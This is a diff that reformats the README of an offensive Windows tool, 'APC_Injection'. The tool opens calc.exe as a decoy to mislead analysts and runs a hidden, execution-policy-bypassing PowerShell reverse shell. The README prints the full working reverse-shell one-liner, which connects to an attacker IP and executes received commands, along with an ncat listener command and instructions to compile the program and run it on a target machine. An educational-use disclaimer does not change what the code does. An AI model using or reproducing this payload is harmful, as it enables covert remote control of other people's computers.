@@ -1,33 +1,45 @@
-APC_Injection Program - README
-Overview
-The APC_Injection program is designed to perform various stealth operations using process injection techniques, including launching benign programs such as calc.exe to mislead analysts and executing a hidden reverse shell using PowerShell for remote control. The goal of this program is to appear benign while running malicious actions in the background, particularly focusing on network communication for remote command execution.
+# APC_Injection Program
 
-This README outlines the key functionalities of the program and how to configure and use it effectively.
+## Overview
 
-Features
-Launch Calculator (Calc.exe): Simulates a benign operation by launching the Windows Calculator.
-Launch Reverse Shell: Uses PowerShell to establish a reverse TCP connection to a remote server, allowing the remote server to send commands and receive responses.
-Stealth Execution: The reverse shell is launched in hidden mode using the powershell -NoP -NonI -W Hidden command, ensuring the command window is not visible to the user.
-Modular Code: The program is organized into separate files to handle different operations, making it easy to modify or extend.
-Components
-The project consists of the following files:
+The **APC_Injection** program is a tool designed to demonstrate advanced process injection techniques. It includes functionalities such as launching benign programs (`calc.exe`) to mislead analysts and executing a hidden reverse shell using PowerShell for remote control. The program emphasizes stealth and modularity, with a focus on simulating real-world adversarial behaviors.
 
-Main.cpp: The main entry point for the program. It calls functions to either launch calc.exe or run a PowerShell reverse shell.
-ShellOperations.cpp: Contains functions for launching both the calculator and the PowerShell reverse shell.
-ShellOperations.h: Header file declaring the functions in ShellOperations.cpp.
-Main.cpp
-This file initializes the program and invokes the following key functions:
+### Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Components](#components)
+- [PowerShell Reverse Shell](#powershell-reverse-shell)
+- [Configuration](#configuration)
+- [Setting Up a Listener](#setting-up-a-listener)
+- [How to Compile and Run](#how-to-compile-and-run)
+- [Disclaimer](#disclaimer)
 
-LaunchCalc() to open the calculator.
-LaunchReverseShell() to start the reverse shell in a hidden PowerShell process.
-ShellOperations.cpp
-LaunchCalc(): This function executes calc.exe using system("calc.exe"), which is a harmless operation to distract from the actual payload.
-LaunchReverseShell(): This function builds and executes a PowerShell command that creates a reverse shell back to a listener on a remote machine.
-ShellOperations.h
-Header file for function declarations:
+---
 
-cpp
-Copy code
+## Features
+
+1. **Launch Calculator (`calc.exe`)**: Simulates benign behavior to distract from the malicious payload.
+2. **Launch Reverse Shell**: Establishes a hidden reverse TCP connection for remote command execution.
+3. **Stealth Execution**: Uses PowerShell commands with options such as `-NoP -NonI -W Hidden` to ensure invisibility.
+4. **Modular Code**: Organized into separate files for maintainability and extensibility.
+
+---
+
+## Components
+
+### 1. `Main.cpp`
+The main entry point of the program:
+- Calls `LaunchCalc()` to open the calculator.
+- Calls `LaunchReverseShell()` to execute a reverse shell in hidden mode.
+
+### 2. `ShellOperations.cpp`
+Contains implementations for:
+- `LaunchCalc()`: Opens the calculator using `system("calc.exe")`.
+- `LaunchReverseShell()`: Builds and executes a PowerShell reverse shell command.
+
+### 3. `ShellOperations.h`
+Header file declaring the functions implemented in `ShellOperations.cpp`:
+```cpp
 #ifndef SHELL_OPERATIONS_H
 #define SHELL_OPERATIONS_H
 
@@ -35,11 +47,12 @@ void LaunchCalc();
 void LaunchReverseShell();
 
 #endif // SHELL_OPERATIONS_H
+
+
 PowerShell Reverse Shell
-The reverse shell is designed to connect back to a remote listener, allowing the remote machine to send commands to the compromised system. The PowerShell reverse shell is hidden and bypasses execution restrictions using -NoP -NonI -W Hidden -Exec Bypass.
+The reverse shell connects back to a remote listener, enabling remote command execution.
 
-Command Structure:
-
+Command Structure
 powershell
 Copy code
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
@@ -47,43 +60,45 @@ $client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <attacker_por
 $stream = $client.GetStream();
 [byte[]]$buffer = 0..65535|%{0};
 while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
-$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i);
-$sendback = (iex $data 2>&1 | Out-String);
-$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$stream.Write($sendbyte, 0, $sendbyte.Length);
-$stream.Flush()};
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i);
+    $sendback = (iex $data 2>&1 | Out-String);
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte, 0, $sendbyte.Length);
+    $stream.Flush()};
 $client.Close()"
 Configuration
-Replace <attacker_ip> with your actual IP address.
-Replace <attacker_port> with the port where the listener is running (e.g., 443).
+Replace <attacker_ip> with the IP address of your machine.
+Replace <attacker_port> with the port number where the listener is running (e.g., 443).
 Setting Up a Listener
-To receive the reverse shell connection, you must set up a listener on your machine. You can use tools such as Netcat (nc) or Ncat.
+To receive the reverse shell connection, set up a listener on your machine.
 
-Netcat Listener Command:
+Netcat Listener Command
 bash
 Copy code
 ncat -lvnp 443
-This sets up a listener on port 443 and will receive the incoming connection from the target machine running the reverse shell.
+This command listens for incoming connections on port 443.
 
 How to Compile and Run
 Prerequisites
-Windows: The program is designed for Windows systems.
-MinGW/G++: Install MinGW to compile the program with G++.
-Administrator Privileges: The reverse shell requires elevated privileges on the target machine.
+Operating System: Windows
+Compiler: MinGW/G++
+Privileges: Administrator privileges are required to execute the reverse shell.
 Compilation
-You can compile the program using the following command:
+Use the following command to compile the program:
 
 bash
 Copy code
 g++ -pipe src/Main.cpp src/ShellOperations.cpp -Iincludes -o APC_Injection.exe
 Running the Program
-Once compiled, run the generated APC_Injection.exe on the target machine:
+After compilation, execute the program on the target machine:
 
 bash
 Copy code
 APC_Injection.exe
 Disclaimer
-This program is intended for educational purposes only. Unauthorized use of this tool on any system without explicit permission is illegal and unethical. The developers of this tool are not responsible for any misuse.
+This program is for educational purposes only. Unauthorized use of this tool on any system without explicit permission is illegal and unethical. The authors are not responsible for any misuse of this software.
 
-By running this program, you acknowledge that it is designed for educational and ethical hacking purposes. Always ensure you have permission before testing on any machine.
+By using this program, you agree to only use it in controlled environments where explicit permission is granted for ethical hacking and educational research.
+
+
